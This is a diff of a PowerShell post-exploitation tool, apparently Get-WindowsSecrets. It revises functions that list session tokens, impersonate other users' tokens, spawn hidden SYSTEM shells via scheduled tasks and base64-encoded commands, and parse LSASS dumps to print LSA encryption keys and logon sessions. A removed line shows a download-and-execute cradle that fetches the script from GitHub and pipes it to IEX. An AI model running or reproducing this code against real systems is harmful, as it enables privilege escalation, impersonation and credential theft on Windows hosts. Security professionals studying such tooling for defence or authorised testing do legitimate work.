 		{
-			Write-Host ("[-] New DACL is null`n");
+			Write-Host ("[-] New DACL is null");
 			return $False
 		}
 
@@ -5564,7 +6258,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$RetVal = [TokensAPI]::SetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
 		if ($RetVal -ne 0)
 		{
-			Write-Host ("[-] SetSecurityInfo() failed with error {0}`n" -f ($retVal));
+			Write-Host ("[-] SetSecurityInfo() failed with error {0}" -f ($retVal));
 			return $False
 		}
 
@@ -5577,16 +6271,16 @@ function Set-DesktopACLToAllowEveryone($hObject)
 
 function ListSessionTokens
 {
-	Write-Host ("`n[===] Listing Session Tokens [===]")
+	Write-Host ("[===] Listing Session Tokens [===]")
 
 	# Load Tokens functions
 	LoadTokensAPI
 
-	# Enable require privilege: SeDebugPrivilege
-	If (-not (EnablePrivilege "SeDebugPrivilege"))
+	# Enable SeDebugPrivilege
+	$RetCode = EnablePrivilege "SeDebugPrivilege"
+	If ($RetCode -ne 0)
 	{
-		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
-		return
+		Write-Host ("[-] Failed to enable SeDebugPrivilege with error {0}. Only processes with same/lower integrity level will be queriable" -f ($RetCode))
 	}
 
 	# Get current proccess ID and session ID
@@ -5595,7 +6289,7 @@ function ListSessionTokens
 	$Res = [TokensAPI]::ProcessIdToSessionId($CurProcID, [ref]$CurSessionID)
 
 	# Enumerate all processes
-	$ArrayMaxProcesses = 100
+	$ArrayMaxProcesses = 10000
 	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
 	$ProcessIds = New-Object UInt32[] $ArrayMaxProcesses
 	$BytesCopied = 0
@@ -5613,7 +6307,7 @@ function ListSessionTokens
 		return
 	}
 
-	Write-Host ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType")
+	Write-Host ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:ImpersonationLevel:LogonType:IsElevatedToken:TokenElevationType")
 
 	# Open each process
 	For ($i = 0; $i -lt $NbProcesses; $i += 1)
@@ -5629,10 +6323,112 @@ function ListSessionTokens
 			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
 			If ($Succeeded)
 			{
-				# Get token information
+				### TokenElevation ###
 				$TokenInfoLength = 0
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenElevation, 0, $TokenInfoLength, [ref]$TokenInfoLength)
+				If (-not $Succeeded)
+				{
+					$lastError = [TokensAPI]::GetLastError()
+					If (($lastError -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER) -and ($lastError -ne [TokensAPI]::ERROR_BAD_LENGTH))
+					{
+						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+						Continue
+					}
+				}
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenElevation, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
+				If (-not $Succeeded)
+				{
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+					Continue
+				}
+
+				$TokenInfo = New-Object TokensAPI+TOKEN_ELEVATION
+				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
+				If ($Cast.TokenIsElevated)
+				{
+					$TokenElevation = $True
+				}
+				Else
+				{
+					$TokenElevation = $False
+				}
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+
+				### TokenElevationType ###
+				$TokenInfoLength = 0
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenElevationType, 0, $TokenInfoLength, [ref]$TokenInfoLength)
+				If (-not $Succeeded)
+				{
+					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
+					{
+						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+						Continue
+					}
+				}
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenElevationType, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
+				If (-not $Succeeded)
+				{
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+					Continue
+				}
+
+				$TokenInfo = New-Object UInt32
+				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
+				$tokenElevationType = [TokensAPI+TOKEN_ELEVATION_TYPE]$Cast
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+
+				### TokenPrivileges: Token privileges ###
+				$TokenInfoLength = 0
+				$Privileges = @()
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenPrivileges, 0, $TokenInfoLength, [ref]$TokenInfoLength)
+				If (-not $Succeeded)
+				{
+					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
+					{
+						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+						Continue
+					}
+				}
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
+				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenPrivileges, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
+				If (-not $Succeeded)
+				{
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+					Continue
+				}
+
+				$TokenInfo = New-Object TokensAPI+TOKEN_PRIVILEGES
+				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
+
+				For ($j = 0; $j -lt $Cast.PrivilegeCount; $j++)
+				{
+					# Get the privilege name
+					$nameBufferLength = 260
+					$nameBuffer = New-Object System.Text.StringBuilder($nameBufferLength)
+					[TokensAPI]::LookupPrivilegeName($null, [ref]$Cast.Privileges[$j].Luid, $nameBuffer, [ref]$nameBufferLength) | Out-Null
+					$privilegeName = $nameBuffer.ToString()
+
+					# Save privilege
+					$Privileges += ($privilegeName)
+				}
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 
 				### TokenUser: SIDPtr to string SID ###
+				$TokenInfoLength = 0
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, 0, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
@@ -5697,6 +6493,14 @@ function ListSessionTokens
 				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
 				$LogonID = $Cast.AuthenticationId.LowPart
 				$TokenType = $Cast.TokenType
+				If ($TokenType -eq [TokensAPI+TOKEN_TYPE]::TokenImpersonation)
+				{
+					$ImpersonationLevel = $Cast.ImpersonationLevel
+				}
+				Else
+				{
+					$ImpersonationLevel = "N/A"
+				}
 				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 
 				### SID to UserName/Domain ###
@@ -5749,38 +6553,58 @@ function ListSessionTokens
 				$Discard = [TokensAPI]::CloseHandle($LuidPtr)
 				$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
 
-				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
-				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
+				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:ImpersonationLevel:LogonType:IsElevatedToken:TokenElevationType
+				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}:{8}:{9}:{10}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $ImpersonationLevel, $LogonType, $TokenElevation, $TokenElevationType))
+				If ($Privileges.Length -gt 0)
+				{
+					Write-Host -NoNewline ("`t[+] Privileges: {0}" -f ($Privileges[0]))
+					For ($k = 1; $k -lt $Privileges.Length; $k++)
+					{
+						Write-Host -NoNewline ":"
+						Write-Host -NoNewline ($Privileges[$k])
+					}
+					Write-Host ""
+				}
+				Else
+				{
+					Write-Host ("`t[-] No privileges for this token")
+				}
 			}
 		}
 	}
 
+	Write-Host ""
+
 	return
 }
 
-function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $ImpersonateCommand)
+function ImpersonateToken($ProcID, $Method, [Switch]$IsSystem, $ImpersonateCommand, [Switch]$NoInteraction)
 {
-	If ((-not $ProcID) -or (-not $Method))
+	$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+	If (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 	{
-		Write-Host ("`n[-] You must provide ProcID and Method parameters`n" -f ($SIDToImpersonate))
-		return
+		Write-Host ("[ERROR] Script must be run with administrator privileges. Exit`n")
+		Exit
 	}
 
-	Write-Host ("`n[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
+	Write-Host ("[===] Impersonating Session Tokens [===]")
+
+	Write-Host ("[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
 	$ProcFound = $False
 
 	# Load Tokens functions
 	LoadTokensAPI
 
-	# Enable require privilege: SeDebugPrivilege
-	If (-not (EnablePrivilege "SeDebugPrivilege"))
+	# Enable require privilege: SeDebugPrivilege. It is required here because we want to query tokens into processes which we not own
+	$RetCode = EnablePrivilege "SeDebugPrivilege"
+	If ($RetCode -ne 0)
 	{
-		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
+		Write-Host ("[-] Failed to enable SeDebugPrivilege with error {0}`n" -f ($RetCode))
 		return
 	}
 
 	# Enumerate all processes
-	$ArrayMaxProcesses = 100
+	$ArrayMaxProcesses = 10000
 	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
 	$ProcessIds = New-Object UInt32[] $ArrayMaxProcesses
 	$BytesCopied = 0
@@ -5833,7 +6657,8 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 
 			If ($Method -eq "ImpersonateLoggedOnUser")
 			{
-				Write-Host ("[-] Using ImpersonateLoggedOnUser() method: New procs/threads will use calling process token")
+				Write-Host ("[+] Using ImpersonateLoggedOnUser() method")
+				Write-Host ("[!] New spawned procs/threads will use calling process token")
 				$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
 				If (-not $Succeeded)
 				{
@@ -5841,7 +6666,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 				}
 				Else
 				{
-					Write-Host ("[+] Successfully impersonated token of requested process ID with ImpersonateLoggedOnUser()")
+					Write-Host ("[+] Successfully impersonated Session Token of requested process ID with ImpersonateLoggedOnUser()")
 					Write-Host ("[+] Running pseudo-shell as {0}\{1}" -f ([Environment]::UserDomainName, [Environment]::UserName))
 					While ($True)
 					{
@@ -5849,12 +6674,18 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 						If (($Command -eq "Exit") -or ($Command -eq "exit")) { Break }
 						IEX $Command
 					}
+
+					Write-Host ""
 				}
 			}
 			Else
 			{
 				If ($Method -eq "CreateProcessWithToken")
 				{
+					# For unknown reason OpenWindowStationW() from Set-DesktopACLs may failed with error 1314 (ERROR_PRIVILEGE_NOT_HELD)
+					# Creating a CIM session which use WSMan under the hood fix the problem, so just create It
+					$CimSession = New-CimSession -ComputerName "localhost"
+
 					# This method allow to spawn a graphical process
 					# When impersonating another user than NT\SYSTEM, this user will not have full permission on the Window Station and Desktop objects and the GUI will be partially rendered
 					# Thus It is required to add an ACL to grant the "Everyone" group full control of the current Windows Station and Desktop
@@ -5865,6 +6696,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 						$Discard = [TokensAPI]::CloseHandle($DupToken)
+						Write-Host ""
 						return
 					}
 
@@ -5878,7 +6710,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 					}
 					Else
 					{
-						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessWithTokenW()`n")
+						Write-Host ("[+] Successfully impersonated Session Token of requested process ID with CreateProcessWithTokenW()`n")
 					}
 
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
@@ -5887,104 +6719,12 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 				{
 					# This method allow to spawn a terminal process
 					# It require NT\SYSTEM access and SeAssignPrimaryTokenPrivilege for calling CreateProcessAsUserW()
-					If ($IsSystem -ne 'True')
+					If ($IsSystem)
 					{
-						Write-Host ("[+] Create System process with ScheduledTasks and System Named Pipes")
-						$StartNamedPipes = '$systemPipeIn = new-object System.IO.Pipes.NamedPipeServerStream ''systemPipeIn'',''In''
-											$systemPipeIn.WaitForConnection()
-											$reader = New-Object System.IO.StreamReader($systemPipeIn)
-											while (($cmd = $reader.ReadLine()) -ne $Null)
-											{
-												If (($cmd -eq ''Exit'') -or ($cmd -eq ''exit''))
-												{
-													Break
-												}
-
-												#IEX $cmd
-												($res = IEX $cmd) 2>&1>$Null
-												$res >> ''C:\Windows\Temp\test.txt''
-											}
-											$reader.Close()
-											$systemPipeIn.Close()'
-
-						$TaskName = "MyTask"
-						$User = "NT AUTHORITY\SYSTEM"
-						$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command $StartNamedPipes"
-						$MyTask = Register-ScheduledTask -TaskName $TaskName -User $User -Action $Action -RunLevel Highest -Force
-						Start-ScheduledTask $TaskName
-
-						$systemPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','systemPipeIn','Out'
-						$systemPipeIn.Connect()
-						$systemWriter = New-Object System.IO.StreamWriter($systemPipeIn)
-						Write-Host ("[+] Connected to System Named Pipes")
-						Write-Host ("[+] Ask new System process to impersonate token and create Token Named Pipes" -f ($ProcID))
-
-						$Command = 'IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")'
-						$systemWriter.WriteLine($Command)
-						$systemWriter.Flush()
-
-						$Command = "ImpersonateToken -ProcID $ProcID -Method CreateProcessAsUser -IsSystem 'True' -ConnectTokenPipe 'False' -ImpersonateCommand 'Null'"
-						$systemWriter.WriteLine($Command)
-						$systemWriter.Flush()
-
-						Write-Host ("[+] Connect to Token Named Pipes")
-
-						$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
-						$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
-						$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
-						$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
-						$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
-						If ($ImpersonateCommand -eq 'Null')
+						$RetCode = EnablePrivilege "SeAssignPrimaryTokenPrivilege"
+						If ($RetCode -ne 0)
 						{
-							While ($True)
-							{
-								$Command = Read-Host -Prompt '$PS>'
-								If (($Command -eq "Exit") -or ($Command -eq "exit"))
-								{
-									$tokenWriter.WriteLine($Command)
-									$tokenWriter.Flush()
-									Break
-								}
-
-								$tokenWriter.WriteLine($Command)
-								$tokenWriter.Flush()
-								$res = $tokenReader.ReadLine()
-								If ($res)
-								{
-									$out = $res.Replace("||||||", "`n")
-									Write-Host ($out)
-								}
-							}
-						}
-						Else
-						{
-							Write-Host ("[+] Executing command")
-							$tokenWriter.WriteLine($ImpersonateCommand)
-							$tokenWriter.Flush()
-							$res = $tokenReader.ReadLine()
-							If ($res)
-							{
-								$out = $res.Replace("||||||", "`n")
-								Write-Host ($out)
-							}
-							
-							$tokenWriter.WriteLine("exit")
-							$tokenWriter.Flush()
-						}
-
-						$tokenReader.Close()
-						$tokenWriter.Close()
-						$tokenPipeIn.Close()
-						$tokenPipeOut.Close()
-						$systemWriter.Close()
-						$systemPipeIn.Close()
-						$DeleteTask = Unregister-ScheduledTask -TaskName $TaskName -Confirm:$False -AsJob
-					}
-					Else
-					{
-						If (-not (EnablePrivilege "SeAssignPrimaryTokenPrivilege"))
-						{
-							Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
+							Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege with error {0}`n" -f ($RetCode))
 							$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 							$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 							$Discard = [TokensAPI]::CloseHandle($DupToken)
@@ -5993,8 +6733,8 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 
 						$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
 						$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
-						$StartNamedPipes = '$tokenPipeOut = new-object System.IO.Pipes.NamedPipeServerStream ''tokenPipeOut'',''Out''
-											$tokenPipeIn = new-object System.IO.Pipes.NamedPipeServerStream ''tokenPipeIn'',''In''
+						$StartNamedPipeCommand = '$tokenPipeOut = New-Object System.IO.Pipes.NamedPipeServerStream ''tokenPipeOut'',''Out''
+											$tokenPipeIn = New-Object System.IO.Pipes.NamedPipeServerStream ''tokenPipeIn'',''In''
 											$tokenPipeIn.WaitForConnection(); $tokenPipeOut.WaitForConnection();
 											$reader = New-Object System.IO.StreamReader($tokenPipeIn)
 											$writer = New-Object System.IO.StreamWriter($tokenPipeOut)
@@ -6030,8 +6770,9 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 											$writer.Close()
 											$tokenPipeIn.Close()
 											$tokenPipeOut.Close()'
+						$B64StartNamedPipeCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($StartNamedPipeCommand))
 
-						$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command $StartNamedPipes")
+						$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $B64StartNamedPipeCommand")
 						$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
 						If (-not $Succeeded)
 						{
@@ -6039,76 +6780,94 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 						}
 						Else
 						{
-							Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessAsUserW()")
-
-							<# Allow to directly interact with newly created process and wait It
-							$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
-							Wait-Process -Id $SpawnProc.ProcessId
-							#>
-
-							If ($ConnectTokenPipe -eq 'True')
-							{
-								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
-								$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
-								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
-								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
-								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
-
-								While ($True)
-								{
-									$Command = Read-Host -Prompt '$PS>'
-									If (($Command -eq "Exit") -or ($Command -eq "exit"))
-									{
-										$tokenWriter.WriteLine($Command)
-										$tokenWriter.Flush()
-										Break
-									}
-
-									$tokenWriter.WriteLine($Command)
-									$tokenWriter.Flush()
-									$res = $tokenReader.ReadLine()
-									If ($res)
-									{
-										$out = $res.Replace("||||||", "`n")
-										Write-Host ($out)
-									}
-								}
-
-								$tokenReader.Close()
-								$tokenWriter.Close()
-								$tokenPipeIn.Close()
-								$tokenPipeOut.Close()
-							}
-							ElseIf ($ImpersonateCommand -ne 'Null')
-							{
-								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
-								$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
-								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
-								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
-								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
-
-								Write-Host ("[+] Executing command")
-								$tokenWriter.WriteLine($ImpersonateCommand)
-								$tokenWriter.Flush()
-								$res = $tokenReader.ReadLine()
-								If ($res)
-								{
-									$out = $res.Replace("||||||", "`n")
-									Write-Host ($out)
-								}
-								
-								$tokenWriter.WriteLine("exit")
-								$tokenWriter.Flush()
-
-								$tokenReader.Close()
-								$tokenWriter.Close()
-								$tokenPipeIn.Close()
-								$tokenPipeOut.Close()
-							}
+							Write-Host ("[+] Successfully impersonated Session Token of requested process ID with CreateProcessAsUserW()`n")
 						}
 
 						[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
 					}
+					Else
+					{
+						# Using ScheduleTask with Powershell interact with the CIM infrastructure
+						# Thus create It to ensure that the necessary communication infrastructure is in place
+						$CimSession = New-CimSession -ComputerName "localhost"
+
+						Write-Host ("[+] Create System process with ScheduledTasks and ask It to impersonate Session Token")
+						$SystemCommand = $TokensFunctions + "`nImpersonateToken -ProcID $ProcID -Method CreateProcessAsUser -IsSystem -NoInteraction"
+						$SystemCommand | Out-File -FilePath "C:\Windows\Tasks\MyScript.ps1"
+
+						$TaskName = "MyTask"
+						$User = "NT AUTHORITY\SYSTEM"
+						$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Tasks\MyScript.ps1"
+						$MyTask = Register-ScheduledTask -TaskName $TaskName -User $User -Action $Action -RunLevel Highest -Force
+						Start-ScheduledTask $TaskName
+
+						$DeleteTask = Unregister-ScheduledTask -TaskName $TaskName -Confirm:$False -AsJob
+					}
+
+					If ($ImpersonateCommand)
+					{
+						$tokenPipeIn = New-Object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
+						$tokenPipeOut = New-Object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
+						$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
+						$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
+						$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
+
+						Write-Host ("[+] Executing command")
+						$tokenWriter.WriteLine($ImpersonateCommand)
+						$tokenWriter.Flush()
+						$res = $tokenReader.ReadLine()
+						If ($res)
+						{
+							$out = $res.Replace("||||||", "`n")
+							Write-Host ($out)
+						}
+
+						$tokenReader.Close()
+						$tokenWriter.Close()
+						$tokenPipeIn.Close()
+						$tokenPipeOut.Close()
+					}
+					ElseIf (-not $NoInteraction)
+					{
+						Write-Host ("[+] Connect to Token Named Pipe")
+						$tokenPipeIn = New-Object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
+						$tokenPipeOut = New-Object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
+						$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
+						$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
+						$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
+
+						While ($True)
+						{
+							$Command = Read-Host -Prompt '$PS>'
+							If (($Command -eq "Exit") -or ($Command -eq "exit"))
+							{
+								$tokenWriter.WriteLine($Command)
+								$tokenWriter.Flush()
+								Break
+							}
+
+							$tokenWriter.WriteLine($Command)
+							$tokenWriter.Flush()
+							$res = $tokenReader.ReadLine()
+							If ($res)
+							{
+								$out = $res.Replace("||||||", "`n")
+								Write-Host ($out)
+							}
+						}
+
+						$tokenReader.Close()
+						$tokenWriter.Close()
+						$tokenPipeIn.Close()
+						$tokenPipeOut.Close()
+					}
+
+					If (-not $IsSystem)
+					{
+						Remove-Item -Path "C:\Windows\Tasks\MyScript.ps1" -Force
+					}
+
+					Write-Host ""
 				}
 				Else
 				{
@@ -6130,6 +6889,12 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 
 	return
 }
+
+$TokensFunctions = "function EnablePrivilege`n{`n`t" + ((Get-Command -Name "EnablePrivilege").Definition) + "}`n"
+$TokensFunctions += "function LoadTokensAPI`n{`n`t" + ((Get-Command -Name "LoadTokensAPI").Definition) + "}`n"
+$TokensFunctions += "function Set-DesktopACLs`n{`n`t" + ((Get-Command -Name "Set-DesktopACLs").Definition) + "}`n"
+$TokensFunctions += "function Set-DesktopACLToAllowEveryone`n{`n`t" + ((Get-Command -Name "Set-DesktopACLToAllowEveryone").Definition) + "}`n"
+$TokensFunctions += "function ImpersonateToken`n{`n`t" + ((Get-Command -Name "ImpersonateToken").Definition) + "}`n"
 
 <#########>
 <# LSASS #>
@@ -9684,9 +10449,9 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 		}
 	}
 
-	Write-Host ("[...] IV = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["IV"]).Replace("-", "")))
-	Write-Host ("[...] DES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["DES_Key"]).Replace("-", "")))
-	Write-Host ("[...] AES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["AES_Key"]).Replace("-", "")))
+	Write-Host ("`t[+] IV = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["IV"]).Replace("-", "")))
+	Write-Host ("`t[+] DES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["DES_Key"]).Replace("-", "")))
+	Write-Host ("`t[+] AES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["AES_Key"]).Replace("-", "")))
 
 	return $LSADecryptor
 }
@@ -10236,17 +11001,17 @@ function Parse-LSASS($Dump)
 		ForEach ($LogonSessionKey in $LogonSessions.Keys)
 		{
 			$LogonSession = $LogonSessions[$LogonSessionKey]
-			Write-Host ("[...] Logon Session {0}" -f ($LogonSessionNb))
+			Write-Host ("[+] Logon Session {0}" -f ($LogonSessionNb))
 			$LogonSessionNb += 1
 
-			If ($LogonSession["Authentication_Id"]) { Write-Host ("`tAuthentication ID = {0}" -f ($LogonSession["Authentication_Id"])) } Else { Write-Host "`tAuthentication ID = None" }
-			If ($LogonSession["Session_Id"]) { Write-Host ("`tSession ID = {0}" -f ($LogonSession["Session_Id"])) } Else { Write-Host "`tSession ID = None" }
-			If ($LogonSession["UserName"]) { Write-Host ("`tUserName = {0}" -f ($LogonSession["UserName"])) } Else { Write-Host "`tUserName = None" }
-			If ($LogonSession["Domain"]) { Write-Host ("`tDomain = {0}" -f ($LogonSession["Domain"])) } Else { Write-Host "`tDomain = None" }
-			If ($LogonSession["LogonServer"]) { Write-Host ("`tLogon Server = {0}" -f ($LogonSession["LogonServer"])) } Else { Write-Host "`tLogon Server = None" }
-			If ($LogonSession["LogonTime"]) { Write-Host ("`tLogon Time = {0}" -f ($LogonSession["LogonTime"])) } Else { Write-Host "`tLogon Time = None" }
-			If ($LogonSession["SID"]) { Write-Host ("`tSID = {0}" -f ($LogonSession["SID"])) } Else { Write-Host "`tSID = None" }
-			If ($LogonSession["LUID"]) { Write-Host ("`tLUID = {0}" -f ($LogonSession["LUID"])) } Else { Write-Host "`tLUID = None" }
+			If ($LogonSession["Authentication_Id"]) { Write-Host ("`t[+] Authentication ID = {0}" -f ($LogonSession["Authentication_Id"])) } Else { Write-Host "`t[+] Authentication ID = None" }
+			If ($LogonSession["Session_Id"]) { Write-Host ("`t[+] Session ID = {0}" -f ($LogonSession["Session_Id"])) } Else { Write-Host "`t[+] Session ID = None" }
